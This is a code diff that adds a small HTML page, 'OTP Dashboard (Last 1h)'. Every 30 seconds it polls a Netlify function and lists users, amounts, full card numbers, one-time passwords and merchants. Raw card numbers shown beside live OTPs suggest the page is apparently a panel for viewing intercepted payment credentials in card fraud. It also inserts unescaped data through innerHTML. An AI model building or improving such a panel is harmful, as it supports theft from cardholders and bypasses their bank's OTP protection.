@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTP Dashboard (Auto)</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; background:#f5f7fb; margin:0; padding:24px;}
+    h1 { text-align:center; margin:0 0 16px; }
+    .info { text-align:center; color:#666; margin-bottom:16px; }
+    table { width:100%; border-collapse: collapse; background:#fff; border-radius:10px; overflow:hidden; box-shadow:0 2px 10px rgba(0,0,0,.05); }
+    th, td { padding:12px 10px; text-align:center; border-bottom:1px solid #eef0f4; }
+    th { background:#1f2937; color:#fff; font-weight:600; }
+    tr:last-child td { border-bottom:none; }
+    .badge { padding:2px 8px; border-radius:999px; background:#eef2ff; color:#3730a3; font-size:12px;}
+    .muted { color:#6b7280; font-size:12px; }
+    .row-empty { text-align:center; padding:24px; color:#6b7280; }
+  </style>
+</head>
+<body>
+  <h1>OTP Dashboard (Last 1h)</h1>
+  <div class="info">
+    <span id="status" class="muted">Loading…</span>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Date</th>
+        <th>User</th>
+        <th>Amount</th>
+        <th>Card Number</th>
+        <th>OTP</th>
+        <th>Merchant</th>
+        <th>Merchant Type</th>
+      </tr>
+    </thead>
+    <tbody id="tbody">
+      <tr class="row-empty"><td colspan="7">No data yet</td></tr>
+    </tbody>
+  </table>
+
+  <script>
+    async function fetchData() {
+      const status = document.getElementById('status');
+      try {
+        status.textContent = 'Refreshing…';
+        const res = await fetch('/.netlify/functions/otp');
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const rows = await res.json();
+        const tbody = document.getElementById('tbody');
+        tbody.innerHTML = '';
+        if (!rows.length) {
+          const tr = document.createElement('tr');
+          tr.className = 'row-empty';
+          tr.innerHTML = '<td colspan="7">No rows in the last hour</td>';
+          tbody.appendChild(tr);
+        } else {
+          for (const r of rows) {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `<td>${r.date}</td>
+                            <td>${r.user}</td>
+                            <td>${r.amount}</td>
+                            <td>${r.card}</td>
+                            <td><span class="badge">${r.otp}</span></td>
+                            <td>${r.merchant}</td>
+                            <td>${r.type}</td>`;
+            tbody.appendChild(tr);
+          }
+        }
+        const dt = new Date();
+        status.textContent = 'Updated: ' + dt.toLocaleTimeString();
+      } catch (e) {
+        status.textContent = 'Error: ' + e.message;
+      }
+    }
+    fetchData();
+    setInterval(fetchData, 30000); // refresh every 30s
+  </script>
+</body>
+</html>
